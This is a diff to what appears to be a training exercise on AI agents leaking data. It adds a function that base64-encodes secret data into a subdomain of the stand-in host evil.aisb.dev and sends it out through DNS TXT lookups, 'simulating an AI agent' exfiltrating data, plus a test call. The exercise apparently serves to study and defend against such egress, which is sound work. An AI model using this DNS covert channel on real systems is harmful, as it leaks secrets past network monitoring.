@@ -141,9 +141,44 @@ def make_evil_request_ftp(secret_data: str) -> Optional[str]:
 
 from w1d2_test import test_make_evil_request_ftp
 
-test_make_evil_request_ftp(make_evil_request_ftp)
+import dns.resolver as dns_resolver  # Alias to avoid conflict with mitmproxy.dns
 
-exfiltrate_data = make_evil_request_ftp
+resolver = dns_resolver.Resolver()
+resolver.nameservers = ["8.8.8.8", "1.1.1.1", "127.0.0.1"]
+
+
+def make_evil_request_dns(secret_data: str) -> Optional[str]:
+    """
+    Send a DNS request to evil.aisb.dev to exfiltrate secret data.
+
+    This simulates an AI agent attempting to communicate using DNS queries.
+
+    Args:
+        secret_data: The secret information to exfiltrate
+
+    Returns:
+        The response text from the DNS query, or None if the request fails
+    """
+    try:
+        secret_encoded = base64.urlsafe_b64encode(secret_data.encode("UTF-8"))
+        secret_url = secret_encoded.decode("UTF-8")
+        url = f"{secret_url}.evil.aisb.dev"
+        res = resolver.resolve(url, 'TXT')
+        if len(res) > 0:
+            res2 = res[0].to_text()
+            return res2
+        else:
+            return None
+    except:
+        return None
+
+# %%
+from w1d2_test import test_make_evil_request_dns
+
+test_make_evil_request_dns(make_evil_request_dns, resolver)
+
+# Set the exfiltration function for use in the exercise
+exfiltrate_data = make_evil_request_dns
 
 # %%
 
